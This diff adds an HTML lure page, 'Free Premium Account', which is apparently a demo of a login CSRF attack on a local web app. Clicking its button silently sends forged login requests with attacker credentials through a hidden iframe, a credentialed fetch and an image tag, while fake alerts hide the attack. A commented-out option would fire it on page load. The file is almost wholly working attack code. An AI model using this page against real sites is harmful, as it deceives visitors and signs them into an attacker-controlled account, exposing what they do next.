@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Premium Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+        .premium-offer {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .premium-badge {
+            color: gold;
+            font-size: 48px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="premium-offer">
+        <h1>🎉 Special Offer! 🎉</h1>
+        <div class="premium-badge">⭐</div>
+        <h2>Get a Free Premium Account!</h2>
+        <p>Limited time offer - Click below to claim your premium account!</p>
+        <button onclick="claimPremium()">Claim Premium Account</button>
+    </div>
+
+    <!-- Hidden iframe for login CSRF -->
+    <iframe id="loginFrame" style="display:none"></iframe>
+
+    <script>
+        function claimPremium() {
+            // Show fake loading
+            alert("Processing your premium account...");
+
+            // Method 1: Using an iframe to perform login CSRF
+            const loginFrame = document.getElementById('loginFrame');
+            loginFrame.src = 'http://localhost:3000/api/login?username=attacker&password=123';
+
+            // Method 2: Using fetch to perform login CSRF
+            fetch('http://localhost:3000/api/login?username=attacker&password=123', {
+                credentials: 'include'
+            }).then(() => {
+                console.log('Login CSRF attempt completed');
+            });
+
+            // Method 3: Using an img tag
+            const img = new Image();
+            img.src = 'http://localhost:3000/api/login?username=attacker&password=123';
+
+            // Show fake success message
+            setTimeout(() => {
+                alert("Premium account activated! (This is fake - the real attack happened in the background)");
+            }, 1000);
+        }
+
+        // Alternative: Auto-trigger on page load
+        // window.onload = function() {
+        //     claimPremium();
+        // }
+    </script>
+</body>
+</html> 
